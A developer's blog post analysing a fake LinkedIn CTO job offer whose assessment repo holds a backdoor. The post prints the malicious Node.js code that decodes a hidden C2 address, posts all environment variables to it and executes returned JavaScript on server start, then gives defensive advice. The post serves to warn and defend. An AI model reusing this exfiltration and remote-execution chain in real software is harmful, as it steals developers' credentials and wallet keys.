The CTO Offer That Was a Trojan Horse

A recruiter on LinkedIn offered me a six-figure CTO role. The "technical assessment" was a GitHub repo with a remote code execution backdoor. Here's exactly how it worked — and how you can protect yourself.

February 2026 12 min read Severity: CRITICAL
⚠

Active Threat — This Is Happening Right Now

This is not theoretical. The malicious code I found was designed to steal every secret on your machine and open a remote shell for the attacker. If you're a developer or engineering leader who receives unsolicited job offers on LinkedIn, this article is for you.

The Setup

It starts with flattery

A few weeks ago, I received a LinkedIn connection request from someone representing a DeFi startup. The pitch was polished: CTO role, competitive salary, generous token allocation, equity. They had a website, a deck, a roadmap. Everything looked plausible enough to warrant a conversation.

Then came the request that always comes: "We'd love for you to review our MVP. Here's the GitHub repo."

This is where most developers would clone the repo, run npm install, and start poking around. I've learned not to do that — not before reading the code first. And that decision, once again, saved me.

Every single time I've been targeted, the company was in the blockchain or crypto space. DeFi protocols, NFT platforms, Web3 infrastructure — the specific project changes, but the industry never does. This is deliberate. Crypto developers routinely work with private keys, mnemonics, and wallet secrets in their local environments. A single environment variable exfiltration can drain wallets and steal funds irreversibly. On at least two other occasions, the malicious code was specifically designed to access my crypto wallet directly — not just server-side secrets, but browser-based wallet connections.

That said, this attack pattern works regardless of your industry. If you're a backend developer with database credentials in your .env file, a DevOps engineer with cloud provider keys, or a mobile developer with API secrets — you're just as vulnerable. The crypto angle is their preferred hunting ground, but the technique is universal.

I've been targeted by this exact pattern at least twice a year for the past 3–4 years on LinkedIn. Every single company was in crypto or blockchain. And every single time, the moment they realize the attack failed, all messages and contact information vanish.
The Playbook

A pattern I've seen too many times

This wasn't an isolated incident. It's a repeatable, refined social engineering playbook that specifically targets developers, CTOs, and tech leads on LinkedIn — with a heavy focus on blockchain and crypto professionals. Here's how it always unfolds:

The Connection

A recruiter, founder, or "Head of Engineering" sends a personalized connection request. The profile often looks legitimate — real-looking photo, connections in common, industry endorsements.

The Offer

A leadership role at a crypto or DeFi startup with a compelling salary range ($180K–$250K+), token allocation, and generous equity. The urgency is calibrated — they need someone "immediately" but aren't pushy. Just flattering.

The Repository

You're asked to clone a GitHub repo and "take a look" or "run it locally." The repo looks like a normal project — proper folder structure, README, package.json, framework code. But somewhere in the codebase, the payload is waiting.

The Disappearance

Within days — sometimes hours — of the attack failing, every trace evaporates. Messages deleted. Profile gone or scrubbed. LinkedIn connection removed. As if the conversation never happened.

Technical Analysis

Instead of running the code, I read it. What I found was a three-stage attack chain spread across three different files — each one designed to look completely innocent on its own. Together, they form a remote code execution pipeline that activates the moment the server starts.

Stage 1 — The innocent-looking decoder

Buried in authService.js, a function called parseToken looks like standard JWT handling. In reality, its only purpose is to decode the attacker's Command & Control URL from a Base64 string.

server/services/authService.js — lines 33-40 Malicious 
const parseToken = (s) => {
  if (!s) return s;
  try {
    return Buffer.from(s, "base64").toString("utf8");
  } catch (err) {
    return s;
  }
};

Named to blend in. Functions like this exist in hundreds of real codebases. But here, it only serves one master.

Stage 2 — Stealing everything

In users.js, a function called verify sends the entire contents of process.env to whatever URL it receives. This is the exfiltration mechanism.

server/mock/users.js — lines 23-25 Malicious 
async function verify(api) {
  return axios.post(api, { ...process.env },
    { headers: { "x-secret-header": "secret" } });
}

What gets sent to the attacker's server:

PRIVATE_KEYS / MNEMONIC

Wallet keys, seed phrases — instant fund theft

JWT_SECRET

Forge any authentication token

DATABASE_URL

Full database connection string

DB_PASSWORD

Direct database access

API_KEYS

Third-party service credentials

process.env.*

Literally everything in your environment

Beyond env vars: direct wallet access

In past attacks I've encountered, the malicious code also attempted to interact with browser-based crypto wallets — trying to trigger transaction approvals, extract stored keys, or exploit wallet extensions. Server-side exfiltration is just one vector; the RCE payload (Stage 3) can do anything on your machine, including reading wallet files from disk or injecting code into browser processes.

Stage 3 — Full remote control

The final payload in dataService.js ties it all together. It decodes the C2 URL, exfiltrates your secrets, receives JavaScript code from the attacker's server, and executes it with full access to Node.js — including require(), meaning fs, child_process, net, and everything else.

server/services/dataService.js — lines 49-65 RCE Payload 
async function verifyToken(req, res) {
  const { data } = persistence;
  verify(parseToken("aHR0cHM6Ly9sb2NhdGUtbXkt..."))
    .then((response) => {
      console.log("Token received successfully");
      const responseData = response.data;
      const executor = new (Function.constructor)("require", responseData);
      executor(require);  // Full Node.js access
      return { success: true, data: responseData };
    });
}
verifyToken();  // Auto-executes on server start

The verifyToken() call at the bottom means this runs automatically when the server starts. No route needs to be hit. No user action required. Just npm start — or even npm install, since the package.json had a prepare script that launched the server.

Tradecraft

How they hid it in plain sight

The sophistication here isn't in the exploit itself — it's in the camouflage. Every function name, file location, and log message was chosen to blend into a normal codebase.

Technique How it was used
Naming parseToken, verify, verifyToken — all sound like legitimate auth logic
Base64 encoding The attacker's server URL is never visible as a plain string in the code
Multi-file split Each file looks harmless alone; the chain only appears when traced across all three
Fake logging "Token verified successfully" makes RCE look like routine auth in server logs
Plausible locations Auth service, user mock data, data service — exactly where you'd expect token logic
Suspicious deps fs and path as npm packages — Node built-ins that should never be installed from npm
The Bigger Picture

Why crypto developers on LinkedIn are the perfect targets

LinkedIn's professional context creates an implicit trust layer that attackers exploit. When someone reaches out about a job opportunity on LinkedIn, our default assumption is legitimacy — because that's what the platform is for. This is exactly what makes it so dangerous.

These aren't spray-and-pray phishing emails. These are targeted, researched, personalized approaches. They know your title, your tech stack, your career trajectory. They reference your work. The flattery feels earned. And the ask — "review our code" — is something any engineering leader would consider normal.

The blockchain and crypto industry is the primary target for a reason. In my experience, every single one of these attacks was wrapped in a crypto or DeFi project. The attackers know that developers in this space work with high-value secrets: wallet private keys, mnemonics, seed phrases, and contract deployment keys. In some of my past encounters, the malicious code didn't just exfiltrate environment variables — it attempted to interact with browser-based crypto wallets directly, trying to trigger approvals or extract stored keys. A successful attack doesn't just compromise a server — it can drain wallets with real, irreversible financial consequences.

But here's the thing: this technique isn't limited to crypto. Any developer who stores secrets in environment variables — database credentials, cloud API keys, payment processor tokens, OAuth secrets — is vulnerable to the exact same exfiltration chain. The attackers chose crypto because the payoff is immediate and untraceable, but the exploit works on every stack, in every industry.

Defense

How to protect yourself

⬡ The #1 rule: use Dev Containers

If you ever need to run code you didn't write — whether it's a take-home assessment, an open-source project, or a repo someone sent you on LinkedIn — never run it directly on your host machine. Use Dev Containers (VS Code's built-in feature, or any Docker-based isolated environment).

A dev container runs the code inside a sandboxed Docker container that is completely isolated from your local filesystem, environment variables, SSH keys, browser wallets, and everything else on your machine. Even if the repo contains a full RCE payload like the one I found, the attacker gains access to nothing — just an empty, disposable container that you can destroy when you're done.

Here's what a dev container protects you from:

  • process.env exfiltration — the container has its own isolated environment, your real secrets are never exposed
  • Filesystem access — your wallet files, SSH keys, ~/.aws credentials, browser data, and personal files are all invisible to the container
  • Reverse shells — even if the attacker opens a shell, they're inside a throwaway container with no access to your network or host
  • npm lifecycle attacks — preinstall, postinstall, and prepare scripts run inside the sandbox, not on your machine

Getting started is simple: install the "Dev Containers" extension in VS Code, add a .devcontainer/devcontainer.json to any project (or let VS Code generate one), and reopen the folder in a container. Every npm install, every node process, every script runs inside the sandbox. It takes two minutes to set up and it could save you from a catastrophic breach.

This should be standard practice for every developer — not just when reviewing suspicious code, but as a default workflow. If the code is safe, you lose nothing. If it's malicious, you lose nothing either.

Before you even clone anything

  • Browse the repository on GitHub first — read the code in your browser before it touches your machine
  • Check package.json for preinstall, postinstall, and prepare scripts — these run automatically on npm install
  • Look for suspicious dependencies — built-in Node modules like fs or path should never appear as npm packages
  • Search for Buffer.from, eval(, Function(, child_process, and process.env across the entire codebase
  • Verify the author's identity — disposable email addresses (GMX, Guerrilla Mail, Temp Mail) in git history are a red flag
  • If you decide to run it, always use a dev container — never run untrusted code on your host machine

Red flags in the "offer"

  • Unsolicited connection requests from profiles with few mutual connections
  • Offers that feel too good — inflated salaries, immediate start, aggressive timelines
  • Pressure to "clone and run" a repo as part of the evaluation process
  • The company's online presence is thin — recently created website, no press coverage, no verifiable team
  • Reluctance to do a video call before the technical assessment
  • Messages or profiles that disappear after you don't comply
Call to Action

To LinkedIn: this needs to stop

This attack vector has been active for years. I've personally encountered it at least 6–8 times since 2022. Each time, the attacker's profile is eventually removed — but only after the damage is done or attempted. The pattern is well-documented in the cybersecurity community, yet it continues to thrive.

LinkedIn needs better mechanisms to detect and prevent recruitment-based social engineering attacks. Profile verification, reporting workflows that actually lead to action, and proactive detection of profiles that follow known attack patterns. The professional trust that makes LinkedIn valuable is the same trust that makes it exploitable.

The best defense is a healthy dose of skepticism, the discipline to read code before running it, and a dev container between you and everything you didn't write. If an offer sounds too good to be true, it probably isn't an offer at all.

If this has happened to you, share your story. The more visible these attacks become, the harder they are to execute. Stay vigilant.
